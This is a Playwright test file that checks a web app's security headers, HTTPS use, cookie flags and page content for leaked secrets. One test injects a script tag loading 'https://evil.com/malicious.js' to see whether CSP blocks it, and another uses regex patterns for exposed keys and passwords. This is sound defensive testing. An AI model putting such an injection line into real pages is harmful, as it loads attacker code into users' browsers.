import { test, expect } from '@playwright/test';

/**
 * E2E Test: Security Features
 * Tests CSP headers, security policies, and protection mechanisms
 */

test.describe('Security Features', () => {
  test('should have Content-Security-Policy header or meta tag', async ({ page }) => {
    const response = await page.goto('/');

    // Check HTTP header
    const cspHeader = response?.headers()['content-security-policy'];

    // Check meta tag
    const cspMeta = await page
      .locator('meta[http-equiv="Content-Security-Policy"]')
      .getAttribute('content');

    // Should have CSP either in header or meta tag
    const hasCSP = cspHeader || cspMeta;
    expect(hasCSP).toBeTruthy();

    // Verify CSP contains important directives
    const csp = cspHeader || cspMeta || '';
    expect(csp).toContain('default-src');
    expect(csp).toContain('script-src');
  });

  test('should have X-Frame-Options protection', async ({ page }) => {
    const response = await page.goto('/');

    // Check HTTP header
    const xfoHeader = response?.headers()['x-frame-options'];

    // Check meta tag
    const xfoMeta = await page
      .locator('meta[http-equiv="X-Frame-Options"]')
      .getAttribute('content');

    // Should have X-Frame-Options
    const hasXFO = xfoHeader || xfoMeta;
    expect(hasXFO).toBeTruthy();

    // Should be DENY or SAMEORIGIN
    const xfo = xfoHeader || xfoMeta || '';
    expect(['DENY', 'SAMEORIGIN']).toContain(xfo);
  });

  test('should have X-Content-Type-Options header', async ({ page }) => {
    const response = await page.goto('/');

    // Check HTTP header
    const xctoHeader = response?.headers()['x-content-type-options'];

    // Check meta tag
    const xctoMeta = await page
      .locator('meta[http-equiv="X-Content-Type-Options"]')
      .getAttribute('content');

    // Should have X-Content-Type-Options
    const hasXCTO = xctoHeader || xctoMeta;
    expect(hasXCTO).toBeTruthy();

    // Should be nosniff
    const xcto = xctoHeader || xctoMeta || '';
    expect(xcto.toLowerCase()).toBe('nosniff');
  });

  test('should have Referrer-Policy configured', async ({ page }) => {
    const response = await page.goto('/');

    // Check HTTP header
    const rpHeader = response?.headers()['referrer-policy'];

    // Check meta tag
    const rpMeta = await page.locator('meta[name="referrer"]').getAttribute('content');

    // Should have Referrer-Policy
    const hasRP = rpHeader || rpMeta;

    // This is optional but recommended
    if (hasRP) {
      const rp = rpHeader || rpMeta || '';
      // Should be a valid policy
      const validPolicies = [
        'no-referrer',
        'no-referrer-when-downgrade',
        'origin',
        'origin-when-cross-origin',
        'same-origin',
        'strict-origin',
        'strict-origin-when-cross-origin',
        'unsafe-url',
      ];
      expect(validPolicies.some(policy => rp.includes(policy))).toBe(true);
    }
  });

  test('should block external script injection', async ({ page }) => {
    await page.goto('/');

    // Try to inject external script
    const scriptInjectionError = await page
      .evaluate(() => {
        try {
          const script = document.createElement('script');
          script.src = 'https://evil.com/malicious.js';
          document.body.appendChild(script);
          return null;
        } catch (e) {
          return e.message;
        }
      })
      .catch(e => e.message);

    // CSP should block or at least prevent execution
    // Even if injection succeeds, CSP will block loading
    console.log(
      'Script injection result:',
      scriptInjectionError || 'Injection attempted (CSP should block)'
    );
  });

  test('should prevent iframe embedding attempts', async ({ page }) => {
    await page.goto('/');

    // Try to create an iframe
    const iframeBlocked = await page.evaluate(() => {
      try {
        const iframe = document.createElement('iframe');
        iframe.src = 'https://example.com';
        document.body.appendChild(iframe);

        // Check if iframe loaded
        return iframe.src === 'https://example.com';
      } catch (e) {
        return false;
      }
    });

    // Iframe might be created but CSP should block loading
    // This test documents the behavior
    console.log('Iframe creation allowed:', iframeBlocked);
  });

  test('should have HTTPS enforcement on production', async ({ page, baseURL }) => {
    // Check if running in production mode
    const isProduction = process.env.NODE_ENV === 'production';
    const isHttps = baseURL?.startsWith('https://');

    if (isProduction) {
      expect(isHttps).toBe(true);
    } else {
      // In development, HTTP is okay
      console.log('Development mode: HTTPS not required');
    }
  });

  test('should not expose sensitive information in HTML', async ({ page }) => {
    await page.goto('/');

    // Get page content
    const content = await page.content();

    // Should not contain common sensitive patterns
    expect(content).not.toMatch(/api[_-]?key\s*[:=]\s*["'][^"']+["']/i);
    expect(content).not.toMatch(/secret\s*[:=]\s*["'][^"']+["']/i);
    expect(content).not.toMatch(/password\s*[:=]\s*["'][^"']+["']/i);
    expect(content).not.toMatch(/private[_-]?key\s*[:=]\s*["'][^"']+["']/i);
  });

  test('should have secure cookie settings if using cookies', async ({ page, context }) => {
    await page.goto('/');

    // Get all cookies
    const cookies = await context.cookies();

    // If cookies are used, they should be secure
    for (const cookie of cookies) {
      // In production, cookies should be secure
      if (process.env.NODE_ENV === 'production') {
        expect(cookie.secure).toBe(true);
      }

      // HttpOnly should be set for session cookies
      if (
        cookie.name.toLowerCase().includes('session') ||
        cookie.name.toLowerCase().includes('token')
      ) {
        expect(cookie.httpOnly).toBe(true);
      }
    }
  });

  test('should not have console errors from security violations', async ({ page }) => {
    const consoleErrors = [];

    page.on('console', msg => {
      if (msg.type() === 'error' && msg.text().toLowerCase().includes('security')) {
        consoleErrors.push(msg.text());
      }
    });

    await page.goto('/');
    await page.waitForLoadState('networkidle');

    // Should have no security-related errors
    expect(consoleErrors.length).toBe(0);
  });
});
